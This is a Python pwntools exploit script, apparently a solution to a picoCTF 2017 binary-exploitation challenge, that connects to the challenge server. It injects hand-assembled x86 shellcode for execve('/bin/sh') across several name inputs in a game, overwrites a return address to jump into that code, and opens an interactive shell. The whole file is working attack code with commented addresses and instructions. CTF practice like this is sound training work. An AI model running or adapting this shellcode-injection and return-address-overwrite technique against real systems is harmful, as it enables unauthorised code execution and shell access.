#! /usr/bin/env python2

from pwn import *

r = remote("shell2017.picoctf.com", 47601)

nprompt = "Enter a name for this centaur:\n"

# make a bunch of 24 byte enemies
for i in xrange(11):
    r.recvuntil("{}: ".format(i))
    r.sendline("c")

print "sending /bin/sh"
# 0
# 0xffffdb90 + 0x0a
r.recvuntil(nprompt)
r.sendline("/bin/sh")

# we want to do execve("/bin/sh", ["/bin/sh", NULL], [NULL])

print "sending [\"/bin/sh\", NULL]"
# 1
# loads ["/bin/sh", NULL]
# 0xffffdba8 + 0x0a
r.recvuntil(nprompt)
r.sendline("\x9a\xdb\xff\xff\x00\x00\x00\x00")

# we have 11 bytes of shellcode per line

print "sending shellcode part 1"
# 2
# 0xffffdbc0 + 0x0a
r.recvuntil(nprompt)
# xor eax, eax
# mov al, 0x0b
# mov ebx, 0xffffdb9c "/bin/sh"
# jmp +0x0d
r.sendline("\x31\xc0" + "\xb0\x0b" + "\xbb\x9a\xdb\xff\xff" + "\xeb\x0d")

print "sending shellcode part 2"
# 3
r.recvuntil(nprompt)
# mov ecx, 0xffffdbb2 ["/bin/sh", NULL]
# nop x4
# jmp +0x0d
r.sendline("\xb9\xb2\xdb\xff\xff" + "\x90\x90\x90\x90" + "\xeb\x0d")

print "sending shellcode part 3"
# 4
r.recvuntil(nprompt)
# mov edx, 0xffffdbb6 [NULL]
# xor esi, esi
# int 0x80
r.sendline("\xba\xb6\xdb\xff\xff" + "\x31\xf6" + "\xcd\x80")

print "sending filler"
# 5
r.recvuntil(nprompt)
r.sendline("AAAA")

print "sending filler"
# 6
r.recvuntil(nprompt)
r.sendline("AAAA")

print "sending filler"
# 7
r.recvuntil(nprompt)
r.sendline("AAAA")

print "sending filler"
# 8
r.recvuntil(nprompt)
r.sendline("AAAA")

print "sending filler"
# 9
r.recvuntil(nprompt)
r.sendline("AAAA")

print "overwriting return address"
# 11
# overwrite the return address
r.recvuntil(nprompt)
r.sendline("AA\xca\xdb\xff\xff")

print "fleeing enemies"
for i in xrange(11):
    r.recvuntil("[F]: Flee\n")
    r.sendline("f")

print "fleeing dragon"
for i in xrange(6):
    r.recvuntil("[F]: Flee\n")
    r.sendline("f")

print "you should now have a shell"

r.interactive()
